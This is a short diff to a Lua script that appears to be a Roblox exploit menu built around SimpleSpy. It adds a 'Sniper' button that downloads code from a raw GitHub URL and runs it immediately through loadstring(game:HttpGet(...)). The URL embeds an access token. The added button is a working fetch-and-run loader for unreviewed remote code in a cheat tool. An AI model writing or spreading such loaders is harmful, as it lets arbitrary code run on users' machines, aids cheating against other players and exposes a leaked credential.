@@ -311,3 +311,13 @@ else
   Notify("SimpleSpy Loaded", 3)
 end ;
 end)
+
+WeLoveCat5:CreateButton("Снайпер", function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/TimaForeveR/NONAME/refs/heads/main/%3F%3F%3F?token=GHSAT0AAAAAAC3O7MNOVEXT4UOBFNVEYZZOZ4NAYHQ",true))()
+if V10 then 
+  Sound(6150774030, 0.1)
+  task.wait(.1)
+  Notify("Sniper Loaded", 3)
+else
+  Notify("Sniper Loaded", 3)
+end ;
+end)
